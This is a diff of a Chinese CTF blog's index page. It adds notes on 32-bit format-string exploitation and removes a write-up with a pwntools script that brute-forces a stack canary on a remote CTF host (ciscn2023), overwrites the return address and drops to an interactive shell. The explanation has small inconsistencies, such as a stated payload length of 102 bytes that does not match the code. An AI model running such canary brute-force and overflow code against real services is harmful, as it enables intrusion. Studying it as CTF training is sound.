+<h1 id="学到了什么？"><a href="#学到了什么？" class="headerlink" title="学到了什么？"></a>学到了什么？</h1><h4 id="1-由于格式化字符串在bss区里，所以我们不能就不能像之前那样随意修改栈上的内容了。我们需要选取一个跳板，利用跳板才能达到修改栈上内容的目的-一般的跳板应该是这样的-栈地址1指向另一个栈地址2，然后地址2又指向另一个栈地址3-最后栈地址3里面的值最好是0。这里我们确定的跳板是"><a href="#1-由于格式化字符串在bss区里，所以我们不能就不能像之前那样随意修改栈上的内容了。我们需要选取一个跳板，利用跳板才能达到修改栈上内容的目的-一般的跳板应该是这样的-栈地址1指向另一个栈地址2，然后地址2又指向另一个栈地址3-最后栈地址3里面的值最好是0。这里我们确定的跳板是" class="headerlink" title="1. 由于格式化字符串在bss区里，所以我们不能就不能像之前那样随意修改栈上的内容了。我们需要选取一个跳板，利用跳板才能达到修改栈上内容的目的:一般的跳板应该是这样的:栈地址1指向另一个栈地址2，然后地址2又指向另一个栈地址3,最后栈地址3里面的值最好是0。这里我们确定的跳板是"></a>1. 由于格式化字符串在bss区里，所以我们不能就不能像之前那样随意修改栈上的内容了。我们需要选取一个跳板，利用跳板才能达到修改栈上内容的目的:一般的跳板应该是这样的:栈地址1指向另一个栈地址2，然后地址2又指向另一个栈地址3,最后栈地址3里面的值最好是0。这里我们确定的跳板是</h4><h4 id="ebp-0xffffcf28-—▸-0xffffcf38-—▸-0xffffcf48-◂—0x0"><a href="#ebp-0xffffcf28-—▸-0xffffcf38-—▸-0xffffcf48-◂—0x0" class="headerlink" title="ebp 0xffffcf28 —▸ 0xffffcf38 —▸ 0xffffcf48 ◂—0x0"></a>ebp 0xffffcf28 —▸ 0xffffcf38 —▸ 0xffffcf48 ◂—0x0</h4><h4 id="2-修改返回地址和写入system函数参数时每次只能写入两个字节，所以在第一次写入或者修改了低两位地址之后，我们需要抬高存储返回地址或函数参数的栈地址两个字节之后再写入或者修改高两位地址。"><a href="#2-修改返回地址和写入system函数参数时每次只能写入两个字节，所以在第一次写入或者修改了低两位地址之后，我们需要抬高存储返回地址或函数参数的栈地址两个字节之后再写入或者修改高两位地址。" class="headerlink" title="2. 修改返回地址和写入system函数参数时每次只能写入两个字节，所以在第一次写入或者修改了低两位地址之后，我们需要抬高存储返回地址或函数参数的栈地址两个字节之后再写入或者修改高两位地址。"></a>2. 修改返回地址和写入system函数参数时每次只能写入两个字节，所以在第一次写入或者修改了低两位地址之后，我们需要抬高存储返回地址或函数参数的栈地址两个字节之后再写入或者修改高两位地址。</h4><p>#参考博客<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46521144/article/details/119567212">https://blog.csdn.net/weixin_46521144/article/details/119567212</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_39268483/article/details/92848463">https://blog.csdn.net/qq_39268483/article/details/92848463</a></p>
+
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://dinkjun.github.io/2023/06/04/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2bss/" data-id="clik88afl0002ggv94ud3c1gs" class="article-share-link">Share</a>
+      <a data-url="https://dinkjun.github.io/2023/06/04/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2bss/" data-id="cliubbu2e000348v9ccle2xlm" class="article-share-link">Share</a>
       
       
     </footer>
@@ -169,7 +268,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://dinkjun.github.io/2023/06/03/64%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E4%BF%AE%E6%94%B9%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80/" data-id="clik88afm0003ggv96b0e3im0" class="article-share-link">Share</a>
+      <a data-url="https://dinkjun.github.io/2023/06/03/64%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E4%BF%AE%E6%94%B9%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80/" data-id="cliubbu2i000848v93kuo87cm" class="article-share-link">Share</a>
       
       
     </footer>
@@ -221,7 +320,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://dinkjun.github.io/2023/06/01/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E6%94%B9%E5%86%99fini%E4%BD%BF%E7%A8%8B%E5%BA%8F%E5%8F%8D%E5%A4%8D/" data-id="clik88afm0004ggv98j0ogn6m" class="article-share-link">Share</a>
+      <a data-url="https://dinkjun.github.io/2023/06/01/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E6%94%B9%E5%86%99fini%E4%BD%BF%E7%A8%8B%E5%BA%8F%E5%8F%8D%E5%A4%8D/" data-id="cliubbu2h000748v9136r911i" class="article-share-link">Share</a>
       
       
     </footer>
@@ -267,7 +366,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://dinkjun.github.io/2023/06/01/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E6%9B%B4%E6%94%B9got%E8%A1%A8/" data-id="clik88afn0005ggv90jw58aor" class="article-share-link">Share</a>
+      <a data-url="https://dinkjun.github.io/2023/06/01/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E6%9B%B4%E6%94%B9got%E8%A1%A8/" data-id="cliubbu2e000448v98zysfzpp" class="article-share-link">Share</a>
       
       
     </footer>
@@ -310,7 +409,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://dinkjun.github.io/2023/06/01/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99%E5%B0%B1%E8%A1%8C2/" data-id="clik88afi0001ggv93rdohgqz" class="article-share-link">Share</a>
+      <a data-url="https://dinkjun.github.io/2023/06/01/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99%E5%B0%B1%E8%A1%8C2/" data-id="cliubbu2d000248v93143bx2f" class="article-share-link">Share</a>
       
       
     </footer>
@@ -359,7 +458,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://dinkjun.github.io/2023/05/31/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99%E5%B0%B1%E8%A1%8C/" data-id="clik88afe0000ggv98txsgq3b" class="article-share-link">Share</a>
+      <a data-url="https://dinkjun.github.io/2023/05/31/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99%E5%B0%B1%E8%A1%8C/" data-id="cliubbu2b000148v966khb03r" class="article-share-link">Share</a>
       
       
     </footer>
@@ -417,7 +516,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://dinkjun.github.io/2023/05/30/64%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-%E4%BF%AE%E6%94%B9%E4%B8%80%E4%B8%AA%E5%80%BC%E5%B0%B1%E8%A1%8C/" data-id="clik88afo0008ggv90pbr0aoz" class="article-share-link">Share</a>
+      <a data-url="https://dinkjun.github.io/2023/05/30/64%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-%E4%BF%AE%E6%94%B9%E4%B8%80%E4%B8%AA%E5%80%BC%E5%B0%B1%E8%A1%8C/" data-id="cliubbu2f000548v95igc1cok" class="article-share-link">Share</a>
       
       
     </footer>
@@ -461,68 +560,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://dinkjun.github.io/2023/05/29/shaokao/" data-id="clik88afn0006ggv9glqc7hmd" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-canary爆破" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2023/05/29/canary%E7%88%86%E7%A0%B4/" class="article-date">
-  <time datetime="2023-05-29T12:54:46.241Z" itemprop="datePublished">2023-05-29</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2023/05/29/canary%E7%88%86%E7%A0%B4/">canary爆破(ciscn2023)</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="canary爆破-ciscn2023"><a href="#canary爆破-ciscn2023" class="headerlink" title="canary爆破(ciscn2023)"></a><strong>canary爆破(ciscn2023)</strong></h1><h2 id="先附上exp："><a href="#先附上exp：" class="headerlink" title="先附上exp："></a>先附上exp：</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">#context.<span class="property">log_level</span> = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">#local = <span class="number">1</span></span><br><span class="line">#io = <span class="title function_">process</span>(<span class="string">&quot;./funcanary&quot;</span>)</span><br><span class="line">io = <span class="title function_">remote</span>(<span class="string">&quot;123.57.248.214&quot;</span>,<span class="number">30391</span>)</span><br><span class="line">io.<span class="title function_">recvuntil</span>(<span class="string">&#x27;welcome\n&#x27;</span>)</span><br><span class="line">canary = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="title function_">range</span>(<span class="number">7</span>):</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="title function_">range</span>(<span class="number">256</span>):</span><br><span class="line">print <span class="string">&quot;the &quot;</span> + <span class="title function_">str</span>(k) + <span class="string">&quot;: &quot;</span> + <span class="title function_">chr</span>(i)</span><br><span class="line">io.<span class="title function_">send</span>(<span class="string">&#x27;a&#x27;</span>*<span class="number">104</span> + canary + <span class="title function_">chr</span>(i))</span><br><span class="line">a = io.<span class="title function_">recvuntil</span>(<span class="string">&quot;welcome\n&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> b<span class="string">&quot;have fun&quot;</span> <span class="keyword">in</span> <span class="attr">a</span>:</span><br><span class="line">canary += <span class="title function_">chr</span>(i)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">payload = b<span class="string">&#x27;A&#x27;</span> * <span class="number">104</span> + canary + b<span class="string">&#x27;A&#x27;</span> * <span class="number">8</span> + b<span class="string">&#x27;\x31\x12&#x27;</span></span><br><span class="line">io.<span class="title function_">send</span>(payload)</span><br><span class="line">io.<span class="title function_">interactive</span>()</span><br></pre></td></tr></table></figure>
-<h2 id="exp的解释："><a href="#exp的解释：" class="headerlink" title="exp的解释："></a>exp的解释：</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="title function_">range</span>(<span class="number">7</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="title function_">range</span>(<span class="number">256</span>):</span><br><span class="line">        print <span class="string">&quot;the &quot;</span> + <span class="title function_">str</span>(k) + <span class="string">&quot;: &quot;</span> + <span class="title function_">chr</span>(i)</span><br><span class="line">        io.<span class="title function_">send</span>(<span class="string">&#x27;a&#x27;</span>*<span class="number">104</span> + canary + <span class="title function_">chr</span>(i))</span><br><span class="line">        a = io.<span class="title function_">recvuntil</span>(<span class="string">&quot;welcome\n&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> b<span class="string">&quot;have fun&quot;</span> <span class="keyword">in</span> <span class="attr">a</span>:</span><br><span class="line">                canary += <span class="title function_">chr</span>(i)</span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
-<p>使用循环嵌套爆破canary值，外层循环控制尝试的canary值的位数，内层循环枚举canary中每一位可能出现的256种取值情况，将’a’、canary和当前尝试的值构成102字节的payload发送给远程主机并接受返回值，如果返回字符串中包含“have fun”就说明当前尝试的值正确，正确的值添加到canary变量中，并且跳出内层循环。</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = b<span class="string">&#x27;A&#x27;</span> * <span class="number">104</span> + canary + b<span class="string">&#x27;A&#x27;</span> * <span class="number">8</span> + b<span class="string">&#x27;\x31\x12&#x27;</span></span><br><span class="line">io.<span class="title function_">send</span>(payload)</span><br><span class="line">io.<span class="title function_">interactive</span>()</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i im <span class="title function_">range</span>(<span class="number">256</span>)</span><br><span class="line">        print <span class="string">&quot;the &quot;</span> + <span class="title function_">str</span>(k) + <span class="string">&quot;: &quot;</span> + <span class="title function_">chr</span>(i)</span><br><span class="line">        io.<span class="title function_">send</span>(<span class="string">&#x27;a&#x27;</span>*<span class="number">104</span> + canary + <span class="title function_">chr</span>(i))</span><br><span class="line">        a = io.<span class="title function_">recvuntil</span>(<span class="string">&quot;welcome\n&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> b<span class="string">&quot;have fun&quot;</span> <span class="keyword">in</span> <span class="attr">a</span>:</span><br><span class="line">     canary += <span class="title function_">chr</span>(i)</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure>
-<ol>
-<li>这部分的代码是对canary的爆破，其中使用了两层for循环来枚举可能的canary值。<br>第一层循环的变量是k，取值范围是0到6，也就是canary可能由7个字节构成（<strong>因为canary最多只有8个字节</strong>）。<br>为什么是7，而不是8呢？因为canary最后一位都是为了填充栈空间而默认为’\x00’，而这个已经在该脚本开头已经定义成了初始值，因此可以省略最后一位的枚举。</li>
-<li>第二层循环的变量是i，取值范围是0到255，也就是枚举了一个字节中可能出现的所有取值情况。为什么要枚举一个字节中的所有可能值呢？因为canary每个字节都是一个字符（包括可打印和不可打印字符），也就是说每个字节可能有256种不同的取值情况。</li>
-<li>然后，在每次循环中，首先将’a’、目前已知的canary值和当前尝试的字符（即对应的ASCII值）拼接成长度为102个字节的payload发送给远程主机，然后接收远程主机的返回值。如果返回字符串中包含“have fun”字符串（即程序顺利执行到结尾，并输出了“have fun”），则说明当前尝试的canary字符正确，将其添加到canary变量中，然后打破内层循环，进行下一轮外层循环。<br>经过这一轮的枚举和爆破，canary变量中按顺序存储了正确的canary的所有字符，可以后续构建完整的payload。</li>
-</ol>
-<p>对于</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = b<span class="string">&#x27;A&#x27;</span> * <span class="number">104</span> + canary + b<span class="string">&#x27;A&#x27;</span> * <span class="number">8</span> + b<span class="string">&#x27;\x31\x12&#x27;</span></span><br><span class="line">io.<span class="title function_">send</span>(payload)</span><br><span class="line">io.<span class="title function_">interactive</span>()</span><br></pre></td></tr></table></figure>
-<ol>
-<li>在栈溢出攻击中，是通过修改栈上返回地址的值，使得程序执行完当前函数后跳转到指定的地址，从而实现攻击者想要的操作。因此，在构造完整的攻击payload时，需要准备一个指定的返回地址，以便程序执行完当前函数后跳转到攻击者指定的代码地址。<ol>
-<li>例如，在这个脚本中，使用8个字节的’A’来填充在canary后面的8个字节，然后再填充一个有意义的返回地址”b’\x31\x12’”，这是在示例代码中手动指定的一个地址，用来保证程序执行到特定的功能代码后跳转回这个地址，从而执行攻击者指定的操作（例如获得程序的shell）。</li>
-</ol>
-</li>
-<li>因此，可以看到payload的构造是这样的：’A’ * 104：填充104个’A’来占位，其中前104个字节是在尝试枚举canary值时所用到的，在实际攻击中这104个字节应该是利用栈溢出漏洞写入的恶意代码。<br>canary：通过canary爆破的结果，来填充正确的canary值。</li>
-</ol>
-<p><strong>‘A’ * 8：这里填充8个’A’的作用是为了将下一个值对齐到8字节（因为栈是按照8字节对齐来维护的），以便能够准确地修改程序执行完当前函数时的返回地址。</strong><br>b’\x31\x12’：手动指定的一个返回地址，用于保证程序执行特定的功能代码后跳转回这个地址，从而执行攻击者指定的操作（例如获得程序的shell）。</p>
-<ol>
-<li>最后，用io.send(payload)将构造好的payload发送给远程主机，然后使用io.interactive()交互式地与控制终端交互，以便利用已经构造好的payload获取程序的shell。  </li>
-</ol>
-<p><strong>注意b”\x31\x12”转化成十六进制就是0x1231即使我们在程序中要返回的地址。</strong></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="https://dinkjun.github.io/2023/05/29/canary%E7%88%86%E7%A0%B4/" data-id="clik88afo0007ggv98lqjd2mw" class="article-share-link">Share</a>
+      <a data-url="https://dinkjun.github.io/2023/05/29/shaokao/" data-id="cliubbu2j000948v9dsdag3cv" class="article-share-link">Share</a>
       
       
     </footer>
@@ -533,6 +571,11 @@
 
   
 
+
+  <nav id="page-nav">
+    
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
+  </nav>
 
 </section>
         
@@ -563,6 +606,14 @@
       <ul>
         
           <li>
+            <a href="/2023/06/13/32%E4%BD%8Dshellcode-%E5%85%B6%E5%AE%9E%E6%98%AF32%E4%BD%8Dsyscall/">32位shellcode(其实是32位syscall)</a>
+          </li>
+        
+          <li>
+            <a href="/2023/06/07/%E6%A0%88%E8%BF%81%E7%A7%BB/">栈迁移</a>
+          </li>
+        
+          <li>
             <a href="/2023/06/04/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2bss/">32位格式化字符串bss</a>
           </li>
         
@@ -572,14 +623,6 @@
         
           <li>
             <a href="/2023/06/01/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E6%94%B9%E5%86%99fini%E4%BD%BF%E7%A8%8B%E5%BA%8F%E5%8F%8D%E5%A4%8D/">32位格式化字符串之改写fini使程序反复</a>
-          </li>
-        
-          <li>
-            <a href="/2023/06/01/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E6%9B%B4%E6%94%B9got%E8%A1%A8/">32位格式化字符串之更改got表</a>
-          </li>
-        
-          <li>
-            <a href="/2023/06/01/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99%E5%B0%B1%E8%A1%8C2/">32位格式化字符串-任意地址写就行2</a>
           </li>
         
       </ul>
